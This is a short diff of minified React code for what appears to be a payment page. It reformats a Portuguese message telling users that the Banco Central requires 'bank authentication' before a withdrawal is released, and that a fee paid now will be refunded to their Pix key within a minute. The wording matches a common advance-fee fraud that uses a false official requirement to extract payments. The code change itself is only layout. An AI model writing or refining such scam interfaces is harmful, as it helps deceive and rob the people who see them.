@@ -195,25 +195,13 @@ const xe = () => {
                 })]
             }), e.jsxs("p", {
                 className: "text-muted-foreground text-[14px] leading-relaxed",
-                children: [
-                    "Autenticação bancária exigida pelo Banco Central para liberação do saque de ", 
-                    e.jsx("strong", {
-                        className: "text-foreground whitespace-nowrap",
-                        children: n(m)
-                    }), 
-                    ". O valor de ", 
-                    e.jsx("strong", {
-                        className: "text-foreground whitespace-nowrap",
-                        children: n(p)
-                    }), 
-                    " ",
-                    // 🔧 Correção: Envolvendo o "será devolvido" para não quebrar a linha
-                    e.jsx("span", {
-                        className: "whitespace-nowrap",
-                        children: "será devolvido"
-                    }),
-                    " integralmente na sua chave Pix em 1 minuto."
-                ]
+                children: ["Autenticação bancária exigida pelo Banco Central para liberação do saque de ", e.jsx("strong", {
+                    className: "text-foreground",
+                    children: n(m)
+                }), ". O valor de ", e.jsx("strong", {
+                    className: "text-foreground",
+                    children: n(p)
+                }), " será devolvido integralmente na sua chave Pix em 1 minuto."]
             }), e.jsxs("div", {
                 className: "mt-3 bg-[#F9FAFB] rounded-[10px] p-3 space-y-1.5",
                 children: [e.jsx("p", {
